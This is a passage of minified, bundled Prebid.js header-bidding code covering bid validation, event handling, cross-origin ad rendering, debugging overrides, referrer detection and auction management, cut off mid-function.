      if (e.getUserSyncs && (a || !i.default.aliasRegistry[e.code])) {
        var u = o.b.getConfig("userSync.filterSettings"),
          s = e.getUserSyncs({
            iframeEnabled: !(!u || !u.iframe && !u.all),
            pixelEnabled: !(!u || !u.image && !u.all)
          }, t, n, r);
        s && (Array.isArray(s) || (s = [s]), s.forEach(function (t) {
          c.a.registerSync(t.type, e.code, t.url);
        }));
      }
    }, "registerSyncs");
    function B(e, t) {
      if (!o.b.getConfig("adpod.brandCategoryExclusion")) return e.call(this, t);
      t.filter(function (e) {
        return Object(v.deepAccess)(e, "mediaTypes.video.context") === m.a;
      }).map(function (e) {
        return e.bids.map(function (e) {
          return e.bidder;
        });
      }).reduce(v.flatten, []).filter(v.uniques).forEach(function (e) {
        var t = i.default.getBidAdapter(e);
        if (t.getSpec().getMappingFileInfo) {
          var n = t.getSpec().getMappingFileInfo(),
            r = n.refreshInDays ? n.refreshInDays : 1,
            o = n.localStorageKey ? n.localStorageKey : t.getSpec().code,
            a = T.getDataFromLocalStorage(o);
          try {
            (!(a = a ? JSON.parse(a) : void 0) || Object(v.timestamp)() > a.lastUpdated + 24 * r * 60 * 60 * 1e3) && Object(y.a)(n.url, {
              success: function (t) {
                try {
                  t = JSON.parse(t);
                  var n = {
                    lastUpdated: Object(v.timestamp)(),
                    mapping: t.mapping
                  };
                  T.setDataInLocalStorage(o, JSON.stringify(n));
                } catch (t) {
                  Object(v.logError)("Failed to parse ".concat(e, " bidder translation mapping file"));
                }
              },
              error: function () {
                Object(v.logError)("Failed to load ".concat(e, " bidder translation file"));
              }
            });
          } catch (t) {
            Object(v.logError)("Failed to parse ".concat(e, " bidder translation mapping file"));
          }
        }
      }), e.call(this, t);
    }
    function _(e, t, n) {
      function r(e) {
        return "Invalid bid from ".concat(t.bidderCode, ". Ignoring bid: ").concat(e);
      }
      return e ? t ? (i = Object.keys(t), I.every(function (e) {
        return p()(i, e) && !p()([void 0, null], t[e]);
      }) ? "native" !== t.mediaType || Object(u.g)(t, n) ? "video" !== t.mediaType || Object(s.d)(t, n) ? !("banner" === t.mediaType && !function (e, t, n) {
        if ((t.width || 0 === parseInt(t.width, 10)) && (t.height || 0 === parseInt(t.height, 10))) return t.width = parseInt(t.width, 10), t.height = parseInt(t.height, 10), !0;
        var r = Object(v.getBidderRequest)(n, t.bidderCode, e),
          i = r && r.bids && r.bids[0] && r.bids[0].sizes,
          o = Object(v.parseSizesInput)(i);
        if (1 === o.length) {
          var a = j(o[0].split("x"), 2),
            c = a[0],
            u = a[1];
          return t.width = parseInt(c, 10), t.height = parseInt(u, 10), !0;
        }
        return !1;
      }(e, t, n)) || (Object(v.logError)(r("Banner bids require a width and height")), !1) : (Object(v.logError)(r("Video bid does not have required vastUrl or renderer property")), !1) : (Object(v.logError)(r("Native bid missing some required properties.")), !1) : (Object(v.logError)(r("Bidder ".concat(t.bidderCode, " is missing required params. Check http://prebid.org/dev-docs/bidder-adapter-1.html for list of params."))), !1)) : (Object(v.logWarn)("Some adapter tried to add an undefined bid for ".concat(e, ".")), !1) : (Object(v.logWarn)("No adUnitCode was supplied to addBidResponse."), !1);
      var i;
    }
    Object(h.a)("checkAdUnitSetup").before(B);
  },
  10: function (e, t, n) {
    function r() {
      return (r = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    var i = n(0),
      o = n(5),
      a = Array.prototype.slice,
      c = Array.prototype.push,
      u = i._map(o.EVENTS, function (e) {
        return e;
      }),
      s = o.EVENT_ID_PATHS,
      d = [];
    e.exports = function () {
      var e = {},
        t = {};
      function n(t, n) {
        i.logMessage("Emitting event for: " + t);
        var r = n[0] || {},
          o = r[s[t]],
          a = e[t] || {
            que: []
          },
          u = i._map(a, function (e, t) {
            return t;
          }),
          f = [];
        d.push({
          eventType: t,
          args: r,
          id: o,
          elapsedTime: i.getPerformanceNow()
        }), o && i.contains(u, o) && c.apply(f, a[o].que), c.apply(f, a.que), i._each(f, function (e) {
          if (e) try {
            e.apply(null, n);
          } catch (e) {
            i.logError("Error executing handler:", "events.js", e);
          }
        });
      }
      return t.on = function (t, n, r) {
        if (function (e) {
          return i.contains(u, e);
        }(t)) {
          var o = e[t] || {
            que: []
          };
          r ? (o[r] = o[r] || {
            que: []
          }, o[r].que.push(n)) : o.que.push(n), e[t] = o;
        } else i.logError("Wrong event name : " + t + " Valid event names :" + u);
      }, t.emit = function (e) {
        var t = a.call(arguments, 1);
        n(e, t);
      }, t.off = function (t, n, r) {
        var o = e[t];
        i.isEmpty(o) || i.isEmpty(o.que) && i.isEmpty(o[r]) || r && (i.isEmpty(o[r]) || i.isEmpty(o[r].que)) || (r ? i._each(o[r].que, function (e) {
          var t = o[r].que;
          e === n && t.splice(t.indexOf(e), 1);
        }) : i._each(o.que, function (e) {
          var t = o.que;
          e === n && t.splice(t.indexOf(e), 1);
        }), e[t] = o);
      }, t.get = function () {
        return e;
      }, t.getEvents = function () {
        var e = [];
        return i._each(d, function (t) {
          var n = r({}, t);
          e.push(n);
        }), e;
      }, t;
    }();
  },
  106: function (e, t, n) {
    "use strict";

    t.a = function () {
      window.addEventListener("message", O, !1);
    };
    var r = n(10),
      i = n.n(r),
      o = n(23),
      a = n(5),
      c = n.n(a),
      u = n(0),
      s = n(18),
      d = n(11),
      f = n.n(d),
      l = n(13),
      b = n(12),
      g = n.n(b),
      p = n(3),
      y = n(41),
      v = c.a.EVENTS.BID_WON,
      m = c.a.EVENTS.STALE_RENDER,
      h = {
        "Prebid Request": function (e, t, n) {
          if (null == n) return void Object(y.a)({
            reason: c.a.AD_RENDER_FAILED_REASON.CANNOT_FIND_AD,
            message: "Cannot find ad '".concat(t.adId, "' for cross-origin render request"),
            id: t.adId
          });
          if (n.status === c.a.BID_STATUS.RENDERED && (Object(u.logWarn)("Ad id ".concat(n.adId, " has been rendered before")), i.a.emit(m, n), Object(u.deepAccess)(p.b.getConfig("auctionOptions"), "suppressStaleRender"))) return;
          try {
            !function (e, t) {
              var n = e.adId,
                r = e.ad,
                i = e.adUrl,
                o = e.width,
                a = e.height,
                c = e.renderer,
                s = e.cpm;
              Object(l.c)(c) ? Object(l.b)(c, e) : n && (j(e), t({
                message: "Prebid Response",
                ad: Object(u.replaceAuctionPrice)(r, s),
                adUrl: Object(u.replaceAuctionPrice)(i, s),
                adId: n,
                width: o,
                height: a
              }));
            }(n, e);
          } catch (e) {
            return void Object(y.a)({
              reason: c.a.AD_RENDER_FAILED_REASON.EXCEPTION,
              message: e.message,
              id: t.adId,
              bid: n
            });
          }
          s.a.addWinningBid(n), i.a.emit(v, n);
        },
        "Prebid Native": function (e, t, n) {
          if (null == n) return void Object(u.logError)("Cannot find ad '".concat(t.adId, "' for x-origin event request"));
          switch (t.action) {
            case "assetRequest":
              e(Object(o.d)(t, n));
              break;
            case "allAssetRequest":
              e(Object(o.c)(t, n));
              break;
            case "resizeNativeHeight":
              n.height = t.height, n.width = t.width, j(n);
              break;
            default:
              if ("click" === Object(o.b)(t, n)) return;
              s.a.addWinningBid(n), i.a.emit(v, n);
          }
        },
        "Prebid Event": function (e, t, n) {
          if (null == n) return void Object(u.logError)("Cannot find ad '".concat(t.adId, "' for x-origin event request"));
          if (n.status !== c.a.BID_STATUS.RENDERED) return void Object(u.logWarn)("Received x-origin event request without corresponding render request for ad '".concat(t.adId, "'"));
          switch (t.event) {
            case c.a.EVENTS.AD_RENDER_FAILED:
              Object(y.a)({
                bid: n,
                id: t.adId,
                reason: t.info.reason,
                message: t.info.message
              });
              break;
            case c.a.EVENTS.AD_RENDER_SUCCEEDED:
              Object(y.b)({
                doc: null,
                bid: n,
                id: t.adId
              });
              break;
            default:
              Object(u.logError)("Received x-origin event request for unsupported event: '".concat(t.event, "' (adId: '").concat(t.adId, "')"));
          }
        }
      };
    function O(e) {
      var t = e.message ? "message" : "data",
        n = {};
      try {
        n = JSON.parse(e[t]);
      } catch (e) {
        return;
      }
      if (n && n.adId && n.message) {
        var r = f()(s.a.getBidsReceived(), function (e) {
          return e.adId === n.adId;
        });
        h.hasOwnProperty(n.message) && h[n.message](function (e) {
          return null == e.origin && 0 === e.ports.length ? function () {
            var e = "Cannot post message to a frame with null origin. Please update creatives to use MessageChannel, see https://github.com/prebid/Prebid.js/issues/7870";
            throw Object(u.logError)(e), new Error(e);
          } : e.ports.length > 0 ? function (t) {
            e.ports[0].postMessage(JSON.stringify(t));
          } : function (t) {
            e.source.postMessage(JSON.stringify(t), e.origin);
          };
        }(e), n, r);
      }
    }
    function j(e) {
      var t = e.adId,
        n = e.adUnitCode,
        r = e.width,
        i = e.height;
      ["div", "iframe"].forEach(function (e) {
        var o = function (e) {
          var r = function (e, t) {
              return Object(u.isGptPubadsDefined)() ? function (e) {
                var t = f()(window.googletag.pubads().getSlots(), function (t) {
                  return f()(t.getTargetingKeys(), function (n) {
                    return g()(t.getTargeting(n), e);
                  });
                });
                return t ? t.getSlotElementId() : null;
              }(e) : Object(u.isApnGetTagDefined)() ? function (e) {
                var t = window.apntag.getTag(e);
                return t && t.targetId;
              }(t) : t;
            }(t, n),
            i = document.getElementById(r);
          return i && i.querySelector(e);
        }(e + ':not([style*="display: none"])');
        if (o) {
          var a = o.style;
          a.width = r + "px", a.height = i + "px";
        } else Object(u.logWarn)("Unable to locate matching page element for adUnitCode ".concat(n, ".  Can't resize it to ad's dimensions.  Please review setup."));
      });
    }
  },
  107: function (e, t, n) {
    "use strict";

    t.a = function (e) {
      var t;
      try {
        e = e || window.sessionStorage, t = JSON.parse(e.getItem(u));
      } catch (e) {}
      t && b(t, !0);
    };
    var r,
      i,
      o = n(3),
      a = n(0),
      c = n(19),
      u = "pbjs:debugging";
    function s(e) {
      Object(a.logMessage)("DEBUG: " + e);
    }
    function d(e) {
      Object(a.logWarn)("DEBUG: " + e);
    }
    function f(e) {
      r = v.bind(e), c.c.before(r, 5), i = m.bind(e), c.e.before(i, 5);
    }
    function l() {
      c.c.getHooks({
        hook: r
      }).remove(), c.e.getHooks({
        hook: i
      }).remove();
    }
    function b(e) {
      var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
      o.b.setConfig({
        debug: !0
      }), l(), f(e), s("bidder overrides enabled".concat(t ? " from session" : ""));
    }
    function g(e, t, n) {
      return !(!e.bidder || e.bidder === t) || !(!e.adUnitCode || e.adUnitCode === n);
    }
    function p(e, t) {
      return Array.isArray(e) && -1 === e.indexOf(t);
    }
    function y(e, t, n) {
      return Object.keys(e).filter(function (e) {
        return -1 === ["adUnitCode", "bidder"].indexOf(e);
      }).reduce(function (t, r) {
        return s("bidder overrides changed '".concat(t.adUnitCode, "/").concat(t.bidderCode, "' ").concat(n, ".").concat(r, " from '").concat(t[r], ".js' to '").concat(e[r], "'")), t[r] = e[r], t;
      }, t);
    }
    function v(e, t, n) {
      var r = this;
      p(r.bidders, n.bidderCode) ? d("bidder '".concat(n.bidderCode, "' excluded from auction by bidder overrides")) : (Array.isArray(r.bids) && r.bids.forEach(function (e) {
        g(e, n.bidderCode, t) || y(e, n, "bidder");
      }), e(t, n));
    }
    function m(e, t) {
      var n = this,
        r = t.filter(function (e) {
          return !p(n.bidders, e.bidderCode) || (d("bidRequest '".concat(e.bidderCode, "' excluded from auction by bidder overrides")), !1);
        });
      Array.isArray(n.bidRequests) && r.forEach(function (e) {
        n.bidRequests.forEach(function (t) {
          e.bids.forEach(function (n) {
            g(t, e.bidderCode, n.adUnitCode) || y(t, n, "bidRequest");
          });
        });
      }), e(r);
    }
    function h(e) {
      if (e.enabled) {
        try {
          window.sessionStorage.setItem(u, JSON.stringify(e));
        } catch (e) {}
        b(e);
      } else {
        l(), s("bidder overrides disabled");
        try {
          window.sessionStorage.removeItem(u);
        } catch (e) {}
      }
    }
    o.b.getConfig("debugging", function (e) {
      return h(e.debugging);
    });
  },
  11: function (e, t) {
    e.exports = function (e, t, n) {
      return e && e.find(t, n);
    };
  },
  12: function (e, t) {
    e.exports = function (e, t, n) {
      return e && e.includes(t, n) || !1;
    };
  },
  13: function (e, t, n) {
    "use strict";

    t.a = u, t.c = function (e) {
      return !(!e || !e.url);
    }, t.b = function (e, t) {
      e.render(t);
    };
    var r = n(21),
      i = n(0),
      o = n(11),
      a = n.n(o),
      c = "outstream";
    function u(e) {
      var t = this,
        n = e.url,
        o = e.config,
        a = e.id,
        u = e.callback,
        d = e.loaded,
        f = e.adUnitCode;
      this.url = n, this.config = o, this.handlers = {}, this.id = a, this.loaded = d, this.cmd = [], this.push = function (e) {
        "function" == typeof e ? t.loaded ? e.call() : t.cmd.push(e) : Object(i.logError)("Commands given to Renderer.push must be wrapped in a function");
      }, this.callback = u || function () {
        t.loaded = !0, t.process();
      }, this.render = function () {
        var e = this,
          t = arguments,
          o = function () {
            e._render ? e._render.apply(e, t) : Object(i.logWarn)("No render function was provided, please use .setRender on the renderer");
          };
        s(f) ? (Object(i.logWarn)("External Js not loaded by Renderer since renderer url and callback is already defined on adUnit ".concat(f)), o()) : (this.cmd.unshift(o), Object(r.a)(n, c, this.callback));
      }.bind(this);
    }
    function s(e) {
      var t = pbjs.adUnits,
        n = a()(t, function (t) {
          return t.code === e;
        });
      if (!n) return !1;
      var r = Object(i.deepAccess)(n, "renderer"),
        o = !!(r && r.url && r.render),
        c = Object(i.deepAccess)(n, "mediaTypes.video.renderer"),
        u = !!(c && c.url && c.render);
      return !!(o && !0 !== r.backupOnly || u && !0 !== c.backupOnly);
    }
    u.install = function (e) {
      return new u({
        url: e.url,
        config: e.config,
        id: e.id,
        callback: e.callback,
        loaded: e.loaded,
        adUnitCode: e.adUnitCode
      });
    }, u.prototype.getConfig = function () {
      return this.config;
    }, u.prototype.setRender = function (e) {
      this._render = e;
    }, u.prototype.setEventHandlers = function (e) {
      this.handlers = e;
    }, u.prototype.handleVideoEvent = function (e) {
      var t = e.id,
        n = e.eventName;
      "function" == typeof this.handlers[n] && this.handlers[n](), Object(i.logMessage)("Prebid Renderer event for id ".concat(t, " type ").concat(n));
    }, u.prototype.process = function () {
      for (; this.cmd.length > 0;) try {
        this.cmd.shift().call();
      } catch (e) {
        Object(i.logError)("Error processing Renderer command: ", e);
      }
    };
  },
  14: function (e, t, n) {
    "use strict";

    t.a = function () {
      return window.pbjs;
    }, window.pbjs = window.pbjs || {}, window.pbjs.cmd = window.pbjs.cmd || [], window.pbjs.que = window.pbjs.que || [], window._pbjsGlobals = window._pbjsGlobals || [], window._pbjsGlobals.push("pbjs");
  },
  16: function (e, t, n) {
    "use strict";

    n.d(t, "b", function () {
      return c;
    }), n.d(t, "a", function () {
      return u;
    }), t.d = function (e, t) {
      var n = Object(r.getBidRequest)(e.requestId, t),
        i = n && Object(r.deepAccess)(n, "mediaTypes.video"),
        o = i && Object(r.deepAccess)(i, "context");
      return s(e, n, i, o);
    }, n.d(t, "c", function () {
      return s;
    });
    n(9);
    var r = n(0),
      i = n(3),
      o = n(12),
      a = (n.n(o), n(8)),
      c = "outstream",
      u = "instream";
    var s = Object(a.b)("sync", function (e, t, n, o) {
      return !t || n && o !== c ? i.b.getConfig("cache.url") || !e.vastXml || e.vastUrl ? !(!e.vastUrl && !e.vastXml) : (Object(r.logError)('\n        This bid contains only vastXml and will not work when a prebid cache url is not specified.\n        Try enabling prebid cache with pbjs.setConfig({ cache: {url: "..."} });\n      '), !1) : o !== c || !!(e.renderer || t.renderer || n.renderer);
    }, "checkVideoBidSetup");
  },
  17: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return o;
    });
    var r = n(3),
      i = n(0);
    var o = function (e) {
      function t(e) {
        var t = r.b.getConfig("pageUrl");
        if (t) return t;
        try {
          var n = e.querySelector("link[rel='canonical']");
          if (null !== n) return n.href;
        } catch (e) {}
        return null;
      }
      return function () {
        var n,
          o,
          a,
          c = [],
          u = function (e) {
            try {
              if (!e.location.ancestorOrigins) return;
              return e.location.ancestorOrigins;
            } catch (e) {}
          }(e),
          s = r.b.getConfig("maxNestedIframes"),
          d = !1,
          f = 0,
          l = !1,
          b = !1;
        do {
          var g = n,
            p = b,
            y = void 0,
            v = !1,
            m = null;
          b = !1, n = n ? n.parent : e;
          try {
            y = n.location.href || null;
          } catch (e) {
            v = !0;
          }
          if (v) {
            if (p) {
              var h = g.context;
              try {
                o = m = h.sourceUrl, l = !0, n === e.top && (d = !0), h.canonicalUrl && (a = h.canonicalUrl);
              } catch (e) {}
            } else {
              Object(i.logWarn)("Trying to access cross domain iframe. Continuing without referrer and location");
              try {
                var O = g.document.referrer;
                O && (m = O, n === e.top && (d = !0));
              } catch (e) {}
              !m && u && u[f - 1] && (m = u[f - 1]), m && !l && (o = m);
            }
          } else {
            if (y && (o = m = y, l = !1, n === e.top)) {
              d = !0;
              var j = t(n.document);
              j && (a = j);
            }
            n.context && n.context.sourceUrl && (b = !0);
          }
          c.push(m), f++;
        } while (n !== e.top && f < s);
        return c.reverse(), {
          referer: o || null,
          reachedTop: d,
          isAmp: l,
          numIframes: f - 1,
          stack: c,
          canonicalUrl: a || null
        };
      };
    }(window);
  },
  18: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return u;
    });
    var r = n(0),
      i = n(19),
      o = n(11),
      a = n.n(o),
      c = n(5);
    var u = function () {
      var e = [],
        t = {};
      return t.addWinningBid = function (t) {
        var n = a()(e, function (e) {
          return e.getAuctionId() === t.auctionId;
        });
        n ? (t.status = c.BID_STATUS.RENDERED, n.addWinningBid(t)) : Object(r.logWarn)("Auction not found when adding winning bid");
      }, t.getAllWinningBids = function () {
        return e.map(function (e) {
          return e.getWinningBids();
        }).reduce(r.flatten, []);
      }, t.getBidsRequested = function () {
        return e.map(function (e) {
          return e.getBidRequests();
        }).reduce(r.flatten, []);
      }, t.getNoBids = function () {
        return e.map(function (e) {
          return e.getNoBids();
        }).reduce(r.flatten, []);
      }, t.getBidsReceived = function () {
        return e.map(function (e) {
          if (e.getAuctionStatus() === i.a) return e.getBidsReceived();
        }).reduce(r.flatten, []).filter(function (e) {
          return e;
        });
      }, t.getAllBidsForAdUnitCode = function (t) {
        return e.map(function (e) {
          return e.getBidsReceived();
        }).reduce(r.flatten, []).filter(function (e) {
          return e && e.adUnitCode === t;
        });
      }, t.getAdUnits = function () {
        return e.map(function (e) {
          return e.getAdUnits();
        }).reduce(r.flatten, []);
      }, t.getAdUnitCodes = function () {
        return e.map(function (e) {
          return e.getAdUnitCodes();
        }).reduce(r.flatten, []).filter(r.uniques);
      }, t.createAuction = function (t) {
        var n = t.adUnits,
          r = t.adUnitCodes,
          o = t.callback,
          a = t.cbTimeout,
          c = t.labels,
          u = t.auctionId,
          s = Object(i.k)({
            adUnits: n,
            adUnitCodes: r,
            callback: o,
            cbTimeout: a,
            labels: c,
            auctionId: u
          });
        return function (t) {
          e.push(t);
        }(s), s;
      }, t.findBidByAdId = function (t) {
        return a()(e.map(function (e) {
          return e.getBidsReceived();
        }).reduce(r.flatten, []), function (e) {
          return e.adId === t;
        });
      }, t.getStandardBidderAdServerTargeting = function () {
        return Object(i.j)()[c.JSON_MAPPING.ADSERVER_TARGETING];
      }, t.setStatusForBids = function (n, r) {
        var i = t.findBidByAdId(n);
        if (i && (i.status = r), i && r === c.BID_STATUS.BID_TARGETING_SET) {
          var o = a()(e, function (e) {
            return e.getAuctionId() === i.auctionId;
          });
          o && o.setBidTargeting(i);
        }
      }, t.getLastAuctionId = function () {
        return e.length && e[e.length - 1].getAuctionId();
      }, t.clearAllAuctions = function () {
        e.length = 0;
      }, t;
    }();
  },
  19: function (e, t, n) {
    "use strict";

    n.d(t, "b", function () {
      return S;
    }), n.d(t, "a", function () {
      return T;
    }), t.k = function (e) {
      var t,
        n,
        o,
        a,
        s = e.adUnits,
        d = e.adUnitCodes,
        f = e.callback,
        b = e.cbTimeout,
        y = e.labels,
        v = e.auctionId,
        R = s,
        P = y,
        x = d,
        q = [],
        M = [],
        G = [],
        F = v || Object(r.generateUUID)(),
        L = f,
        V = b,
        z = [],
        H = new Set();
      function K() {
        return {
          auctionId: F,
          timestamp: t,
          auctionEnd: n,
          auctionStatus: o,
          adUnits: R,
          adUnitCodes: x,
          labels: P,
          bidderRequests: q,
          noBids: G,
          bidsReceived: M,
          winningBids: z,
          timeout: V
        };
      }
      function Y(e, t) {
        if (t && clearTimeout(a), void 0 === n) {
          var i = [];
          e && (Object(r.logMessage)("Auction ".concat(F, " timedOut")), c = H, (i = q.map(function (e) {
            return (e.bids || []).filter(function (e) {
              return !c.has(e.bidder);
            });
          }).reduce(r.flatten, []).map(function (e) {
            return {
              bidId: e.bidId,
              bidder: e.bidder,
              adUnitCode: e.adUnitCode,
              auctionId: e.auctionId
            };
          })).length && E.emit(A.EVENTS.BID_TIMEOUT, i)), o = T, n = Date.now(), E.emit(A.EVENTS.AUCTION_END, K()), U(R, function () {
            try {
              if (null != L) {
                var t = x,
                  n = M.filter(r.bind.call(r.adUnitsFilter, this, t)).reduce(W, {});
                L.apply(pbjs, [n, e, F]), L = null;
              }
            } catch (e) {
              Object(r.logError)("Error executing bidsBackHandler", null, e);
            } finally {
              i.length && j.callTimedOutBidders(s, i, V);
              var o = u.b.getConfig("userSync") || {};
              o.enableOverride || O(o.syncDelay);
            }
          });
        }
        var c;
      }
      function J() {
        u.b.resetBidder(), Object(r.logInfo)("Bids Received for Auction with id: ".concat(F), M), o = T, Y(!1, !0);
      }
      function Q(e) {
        H.add(e);
      }
      function $(e) {
        var t = this;
        e.forEach(function (e) {
          var t;
          t = e, q = q.concat(t);
        });
        var n = {},
          s = {
            bidRequests: e,
            run: function () {
              var s, b;
              s = Y.bind(null, !0), b = setTimeout(s, V), a = b, o = S, E.emit(A.EVENTS.AUCTION_INIT, K());
              var y = function (e, t) {
                var n = 0,
                  o = !1,
                  a = new Set(),
                  s = {},
                  d = {};
                function f(e, t) {
                  var n = e.bidderRequestId;
                  null == d[n] && (d[n] = Promise.resolve()), d[n] = d[n].then(function () {
                    return Promise.resolve(t).catch(function () {});
                  });
                }
                function b(e, n) {
                  var r = e.timeout;
                  (null == r || r > t.getTimeout()) && (r = t.getTimeout());
                  var i = t.getAuctionStart() + r - Date.now(),
                    o = d[e.bidderRequestId];
                  null != o && i > 0 ? Promise.race([new Promise(function (e) {
                    return setTimeout(e, i);
                  }), o]).then(n) : n();
                }
                function y() {
                  n--, o && 0 === n && e();
                }
                function v(e, o) {
                  var a = this;
                  s[o.requestId] = !0, n++;
                  var d = function (e) {
                    var t = e.adUnitCode,
                      n = e.bid,
                      o = e.bidderRequest,
                      a = e.auctionId,
                      s = o.start,
                      d = h({}, n, {
                        auctionId: a,
                        responseTimestamp: Object(r.timestamp)(),
                        requestTimestamp: s,
                        cpm: parseFloat(n.cpm) || 0,
                        bidder: n.bidderCode,
                        adUnitCode: t
                      });
                    d.timeToRespond = d.responseTimestamp - d.requestTimestamp, E.emit(A.EVENTS.BID_ADJUSTMENT, d);
                    var f = o.bids && l()(o.bids, function (e) {
                        return e.adUnitCode == t && e.bidId == d.requestId;
                      }),
                      b = f && f.renderer,
                      g = d.mediaType,
                      p = f && f.mediaTypes && f.mediaTypes[g],
                      y = p && p.renderer,
                      v = null;
                    y && y.url && y.render && (!0 !== y.backupOnly || !n.renderer) ? v = y : b && b.url && b.render && (!0 !== b.backupOnly || !n.renderer) && (v = b);
                    v && (d.renderer = c.a.install({
                      url: v.url
                    }), d.renderer.setRender(v.render));
                    var O = N(n.mediaType, f, u.b.getConfig("mediaTypePriceGranularity")),
                      j = Object(i.a)(d.cpm, "object" === m(O) ? O : u.b.getConfig("customPriceBucket"), u.b.getConfig("currency.granularityMultiplier"));
                    return d.pbLg = j.low, d.pbMg = j.med, d.pbHg = j.high, d.pbAg = j.auto, d.pbDg = j.dense, d.pbCg = j.custom, d;
                  }({
                    adUnitCode: e,
                    bid: o,
                    bidderRequest: a,
                    auctionId: t.getAuctionId()
                  });
                  "video" === d.mediaType ? function (e, t, n, i) {
                    var o = !0,
                      a = Object(r.getBidRequest)(t.originalRequestId || t.requestId, [n]),
                      c = a && Object(r.deepAccess)(a, "mediaTypes.video"),
                      s = c && Object(r.deepAccess)(c, "context");
                    u.b.getConfig("cache.url") && s !== p.b && (!t.videoCacheKey || u.b.getConfig("cache.ignoreBidderCacheKey") ? (o = !1, k(e, t, i, a)) : t.vastUrl || (Object(r.logError)("videoCacheKey specified but not required vastUrl for video bid"), o = !1));
                    o && (D(e, t), i());
                  }(t, d, a, y) : (D(t, d), y());
                }
                function O() {
                  var i = this,
                    c = t.getBidRequests(),
                    d = u.b.getConfig("auctionOptions");
                  if (a.add(i), d && !Object(r.isEmpty)(d)) {
                    var f = d.secondaryBidders;
                    f && !c.every(function (e) {
                      return g()(f, e.bidderCode);
                    }) && (c = c.filter(function (e) {
                      return !g()(f, e.bidderCode);
                    }));
                  }
                  o = c.every(function (e) {
                    return a.has(e);
                  }), i.bids.forEach(function (e) {
                    s[e.bidId] || (t.addNoBid(e), E.emit(A.EVENTS.NO_BID, e));
                  }), o && 0 === n && e();
                }
                return {
                  addBidResponse: function () {
                    for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                    f(this, B.apply({
                      dispatch: v,
                      bidderRequest: this
                    }, t));
                  },
                  adapterDone: function () {
                    b(this, O.bind(this));
                  }
                };
              }(J, t);
              j.callBids(R, e, function () {
                for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                y.addBidResponse.apply(this, t);
              }, y.adapterDone, {
                request: function (e, t) {
                  f(I, t), f(n, e), C[e] || (C[e] = {
                    SRA: !0,
                    origin: t
                  }), n[e] > 1 && (C[e].SRA = !1);
                },
                done: function (e) {
                  I[e]--, w[0] && d(w[0]) && w.shift();
                }
              }, V, Q);
            }
          };
        function d(e) {
          var t = !0,
            n = u.b.getConfig("maxRequestsPerOrigin") || 4;
          return e.bidRequests.some(function (e) {
            var r = 1,
              i = void 0 !== e.src && e.src === A.S2S.SRC ? "s2s" : e.bidderCode;
            return C[i] && (!1 === C[i].SRA && (r = Math.min(e.bids.length, n)), I[C[i].origin] + r > n && (t = !1)), !t;
          }), t && e.run(), t;
        }
        function f(e, t) {
          void 0 === e[t] ? e[t] = 1 : e[t]++;
        }
        d(s) || (Object(r.logWarn)("queueing auction due to limited endpoint capacity"), w.push(s));
      }
      return {
        addBidReceived: function (e) {
          M = M.concat(e);
        },
        addNoBid: function (e) {
          G = G.concat(e);
        },
        executeCallback: Y,
        callBids: function () {
          o = "started", t = Date.now();
          var e = j.makeBidRequests(R, t, F, V, P);
          Object(r.logInfo)("Bids Requested for Auction with id: ".concat(F), e), e.length < 1 ? (Object(r.logWarn)("No valid bid requests returned for auction"), J()) : _.call({
            dispatch: $,
            context: this
          }, e);
        },
        addWinningBid: function (e) {
          z = z.concat(e), j.callBidWonBidder(e.bidder, e, s);
        },
        setBidTargeting: function (e) {
          j.callSetTargetingBidder(e.bidder, e);
        },
        getWinningBids: function () {
          return z;
        },
        getAuctionStart: function () {
          return t;
        },
        getTimeout: function () {
          return V;
        },
        getAuctionId: function () {
          return F;
        },
        getAuctionStatus: function () {
          return o;
        },
        getAdUnits: function () {
          return R;
        },
        getAdUnitCodes: function () {
          return x;
        },
        getBidRequests: function () {
          return q;
        },
        getBidsReceived: function () {
          return M;
        },
        getNoBids: function () {
          return G;
        }
      };
    }, n.d(t, "c", function () {
      return B;
    }), n.d(t, "e", function () {
      return _;
    }), t.g = R, t.d = D, n.d(t, "f", function () {
      return k;
    }), n.d(t, "i", function () {
      return P;
    }), n.d(t, "h", function () {
      return x;
    }), t.j = M;
    var r = n(0),
      i = n(29),
      o = n(23),
      a = n(40),
      c = n(13),
      u = n(3),
      s = n(30),
      d = n(8),
      f = n(11),
      l = n.n(f),
      b = n(12),
      g = n.n(b),
      p = n(16),
      y = n(2),
      v = n(27);
    function m(e) {
      return (m = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function h() {
      return (h = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    var O = s.a.syncUsers,
      j = n(9).default,
      E = n(10),
      A = n(5),
      S = "inProgress",
      T = "completed";
    E.on(A.EVENTS.BID_ADJUSTMENT, function (e) {
      !function (e) {
        var t = e.bidderCode,
          n = e.cpm,
          i = v.a.get(t || null, "bidCpmAdjustment");
        if (i && "function" == typeof i) try {
          n = i(e.cpm, h({}, e));
        } catch (e) {
          Object(r.logError)("Error during bid adjustment", "bidmanager.js", e);
        }
        n >= 0 && (e.cpm = n);
      }(e);
    });
    var I = {},
      C = {},
      w = [];
    var B = Object(d.b)("sync", function (e, t) {
        return this.dispatch.call(this.bidderRequest, e, t);
      }, "addBidResponse"),
      _ = Object(d.b)("sync", function (e) {
        this.dispatch.call(this.context, e);
      }, "addBidderRequests"),
      U = Object(d.b)("async", function (e, t) {
        t && t();
      }, "bidsBackCallback");
    function R(e, t) {
      t.timeToRespond > e.getTimeout() + u.b.getConfig("timeoutBuffer") && e.executeCallback(!0);
    }
    function D(e, t) {
      var n = e.getBidRequests(),
        r = l()(n, function (e) {
          return e.bidderCode === t.bidderCode;
        });
      !function (e, t) {
        var n,
          r = !0 === v.a.get(e.bidderCode, "allowZeroCpmBids") ? e.cpm >= 0 : e.cpm > 0;
        if (e.bidderCode && (r || e.dealId)) {
